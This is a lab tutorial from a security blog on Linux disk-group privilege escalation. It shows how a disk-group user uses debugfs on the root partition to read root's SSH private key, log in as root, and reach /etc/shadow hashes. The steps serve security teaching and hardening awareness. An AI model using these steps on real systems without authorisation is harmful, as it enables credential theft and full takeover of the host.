<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Disk Group Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/disk-group-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2024-04-27T09:45:10+00:00">April 27, 2024</time><time class="updated" datetime="2025-06-19T13:23:22+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000"><strong data-start="175" data-end="210">Disk Group Privilege Escalation</strong> is a complex attack method that targets <strong data-start="251" data-end="270">vulnerabilities</strong> or <strong data-start="274" data-end="295">misconfigurations</strong> within the <strong data-start="307" data-end="339">disk group management system</strong> of <strong data-start="343" data-end="365">Linux environments</strong>. Specifically, attackers often focus on disk devices such as <strong data-start="427" data-end="439" data-is-only-node="">/dev/sda</strong>, which represents the <strong data-start="462" data-end="484">primary hard drive</strong> in <strong data-start="488" data-end="505">Linux systems</strong> and typically corresponds to the first <strong data-start="545" data-end="587">SCSI (Small Computer System Interface)</strong> disk device. During <strong data-start="608" data-end="643">Disk Group Privilege Escalation</strong> attacks, they exploit vulnerabilities or misconfigurations linked to <strong data-start="713" data-end="725">/dev/sda</strong> and similar devices to gain <strong data-start="754" data-end="777">unauthorized access</strong> to <strong data-start="781" data-end="799">sensitive data</strong> or further exploit related weaknesses. Moreover, by <strong data-start="852" data-end="880">manipulating permissions</strong> or exploiting <strong data-start="895" data-end="916">misconfigurations</strong> concerning disk devices, attackers aim to <strong data-start="959" data-end="988">escalate their privileges</strong> or access <strong data-start="999" data-end="1028">critical system resources</strong>.</span></p>
<h3><span style="color: #800000">Table of Contents</span></h3>
<ul>
<li><strong><span style="color: #000000">Lab Setup</span></strong></li>
<li><strong><span style="color: #000000">Configuration</span></strong></li>
<li><strong><span style="color: #000000">Exploitation</span></strong></li>
<li><strong><span style="color: #000000">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000">Lab Setup</span></h3>
<p><span style="color: #000000">In this article, we are going to exploit the disk group privilege escalation vulnerability on the ubuntu machine and obtain the root access. Following are the machines:</span></p>
<p><span style="color: #000000">Target Machine: Ubuntu (192.168.1.6)</span></p>
<p><span style="color: #000000">Attacker Machine: Kali Linux (192.168.1.7)</span></p>
<h3><span style="color: #800000">Configuration</span></h3>
<p><span style="color: #000000">Let’s start by creating a new user <strong>raj</strong> in the ubuntu machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">adduser raj</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSdjF8PbDnPdVp9Hu1AQCEDoiRsGsuLzrObADtJQ7B6XGTHHCTB5TwCSww0L9BcNsIDeHmOi1lIO2T6aSWvPSpIXwYunyl6XTZ9GfxO4LraAGNSxIPwXoID-h4iq9b5XAbj3r0i9AfV-PG-WHDDITdMZp_4Bn3ni98GORohd07PUcAcck-8sQwtwc5A8-P/s16000/1.png"/></p>
<p><span style="color: #000000">Add the newly created <strong>raj</strong> user to the <strong>disk</strong> group using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usermod -aG disk raj
groups raj</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEt8YlJWzHDTvE7fvjXah7gr-owXLvRDyYNs0sntbiTtZqyCT7qSlR-xa7uq8XlTclpHpJKDC6YPJrTOGc2OyorBroW895JWStzekIKoklav5mZr0f9PhYt0ZakdHRE_FOV-22rzQP0OYYFJHVJSDRuiERDV65rw0F_FeyXNDZ2dUKekoyuzESb5ee8NG5/s16000/2.png"/></p>
<p><span style="color: #000000">Install the <strong>openssh-server</strong> using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install openssh-server</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLi04ybytFK8_Ubd4vEPuEETO5OAywBmwo0l7LhOC0cuhsqd6h3ALGpR8qENb1XFvvs8_uR2sH0LnSX9NMHG1yjfvVCA2EgddYB7TMLYvEyKDoHmlJ-_mU0UzG0bwqYr8LrIr7wnPLbFLFqHYS9CXha7NCvh4Vsp_k1yfb4MWGCqG2Se-6fLMdqk1rZZVL/s16000/3.png"/></p>
<p><span style="color: #000000">Generate the <strong>ssh</strong> <strong>private key</strong> and <strong>public key</strong> for the root user using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen
mv id_rsa.pub authorized_keys</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgL_9JC0Msp65NRmoZRoUof_Jx9muUmWIS5J5TiZvcNuL2yTP8Cd7Wl1PfCuo836Di3HVOfvWfcAOODqpuyPdvR1MVzLsg6XnOQbGcgNOt_dWTkkB-u2O-rViQsdcX7KoDPHbmg58hjyT61lppXWuSqmPRqnF6rwvMhD5bUbm5u6MIHkVEfHQH08OWifELJ/s16000/4.png"/></p>
<p><span style="color: #000000">By default, inside the <strong>sshd server system-wide configuration file</strong> options for <strong>PermitRootLogin</strong> and <strong>PubkeyAuthentication</strong> is commented out.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFkUD7baVSxft-KztSTx5f9XUOfCq3kSainZ9lCbYCjZWBuoxMMFXLsX9ffObVAzPSofKIOEMEnVx8dwhGMgbTNP55gayAgliSb6TKzZlCsV9kEswoH_fmphVsu2hUNfJaWjaAUBFg8T1snyWgdYj2OvDwDwzfeIDbrcJzkMq7sTfyHutAi4IpFz7QBLa_/s16000/5.png"/></p>
<p><span style="color: #000000">Here, we need to perform two changes in the configuration file, the first one is changing the value of <strong>PermitRootLogin</strong> to <strong>yes</strong> and removing the comment (#) and second is removing the comment (#) on the <strong>PubKeyAuthentication.</strong></span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt-kjt7kNhNvjou3OKcIjHUxWgJdOWfZgichZPSvEYFSnHv6JGBwUira86k-LeoANIO9yBWs80lTKK-RKA8WEO_RCkO1Bi0IRNmaAgBColKbsFSCDvR9J2jjnN29Md4kq_d8wfNY64daFq0xLTRGzmpQsNZvEEVgUhMdijbD_K1fVB1OwVc6uOrhXSVx90/s16000/6.png"/></p>
<p><span style="color: #000000">Now, after the configuration is complete restart the <strong>ssh </strong>service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">service ssh restart
service ssh status</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNwf7yrNGt1wr8ywipCs7Gelee2_wydjMnBvpzxUFuCygYgbKYGHrn7L4OCgl6y1pW7SVX9SgVaAvZsR8XYmLQmPqe8EEsqC2Z4zlqPy6GgkbRcFpng_QzJR7kUyYrslDOMPCbt5lLy3ou6zntInjQGLSC4m3e1F4JVX4557gKgc7v9_0Th-9LQOAEKK6d/s16000/7.png"/></p>
<h3><span style="color: #800000">Exploitation</span></h3>
<p><span style="color: #000000">Since the disk group misconfiguration vulnerability is a privilege escalation technique in linux, so we are taking an initial shell using the <strong>ssh </strong>service and as <strong>raj</strong> user to show the privilege escalation part using this vulnerability.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh raj@192.168.1.6</pre>
<p><span style="color: #000000">We can use the <strong>id</strong> command to verify the <strong>groups</strong> that <strong>raj</strong> user belongs to. It can be seen that <strong>raj</strong> is a member of <strong>disk</strong> group.</span></p>
<p><span style="color: #000000">To check the <strong>disk space summary</strong> for each mounted file in <strong>human-readable</strong> format we will use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">df -h</pre>
<p><span style="color: #000000">Here we are going to consider the partition where the <strong>/</strong> (root) directory is mounted i.e., <strong>/dev/sda3</strong>.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8eqLE_lXQwRZJcCGAWIrBMBH8h2P-_nSQEWqRhyUpSB62L-hQyS1v9UZ7aZCXjU4hMqLiL9KBH3g3dRvs8cgdjtphL9ZSvcg-njouuye45meJyvpPkfi073eVlPDpLFXV2KBzW05slvO49d7OGqO8A4Gk5jW2wNWN-I6zRn_RUty_06vMc8ugQYV7G8gX/s16000/8.png"/></p>
<p><span style="color: #000000">After selecting the partition, we can now examine and modify it using the <strong data-start="1105" data-end="1124">debugfs utility</strong> in <strong data-start="1128" data-end="1137">Linux</strong>. Additionally, this utility allows us to <strong data-start="1179" data-end="1201">create a directory</strong> or <strong data-start="1205" data-end="1226">read the contents</strong> of an existing directory.</span></p>
<p><span style="color: #000000">After creating a test directory using <strong>debugfs</strong> utility, it shows that the filesystem has <strong>read/only</strong> permissions. So, we can try here reading the ssh <strong>private key</strong> of root user so that we can login later using the ssh private key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">debugfs /dev/sda3
mkdir test
cat /root/.ssh/id_rsa</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3aFyDLc-iCjQ29Tqg0k7gB0IkPVuMiuWcbP8-qorat_egHSb59y2xk-nfnR32BEwgZAirru2Zb7orEbP8B3F9kLb7EGu3sKVxjB_sr79zoZIIdBWKsrbxIrVwjEXguT0BpdtNAF355x8nAtBxN3_Tq3zhn8_j-aEAXVy-P-Zfa1u7JrjbrrM1216te3xO/s16000/9.png"/></p>
<p><span style="color: #000000">Since we are able to read the openssh <strong>private key</strong> of the root user, so we can copy the private key and paste in a file and give it <strong>limited permissions</strong> so that it should not be <strong>overly permissive private key</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@192.168.1.6
id</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhesZb4MP9-1fbapA-mjHC5MBpB1aBdvz9aGUqvhtiRS7xpihNvRuf5yE6n5MnrIx41qxXZiJs2w-h2minWM0XQZUoX9vXwGpghqFj7rqSy2MQBmfNxrhuwlVeka9StJoGSi5XDO4nTugQxP5-0F1gB9uI7SzyuRDxz8KJ1x7NpW71QrESokCiHrn6PJwNi/s16000/10.png"/></p>
<p><span style="color: #000000">Observe that the privilege escalation is performed, and the attacker has the root access. Now we can read the <strong>/etc/shadow</strong> file and obtain the hashes of other users.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeZsT95uWFGFzH6W6upEUodSGKs1scO6YUN8RkstWFcQ9mDxlPXMA5EGQClBXLFKyDyoyICoQ-oNU099rEgMgOE24cJ8cTpaWhyphenhyphen7oimyeLdUHmBeF7omrUNGVBWLRfnuug-9yEvCjgT1l02nAok5uM-gXLGBVWiokTwAwpUykG05MYvgxk0FtsLvWOpjU5/s16000/11.png"/></p>
<h3><span style="color: #800000">Conclusion</span></h3>
<p><span style="color: #000000">Disk Group Privilege Escalation is a major concern for the security of Linux systems. It allows attackers to gain unauthorized access to sensitive data and elevate their privileges. It’s essential to grasp how this attack works and to establish robust security measures to protect against it. Doing so is vital for minimizing risks and ensuring systems remain safe from exploitation.</span></p>
<p><span style="color: #000000"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
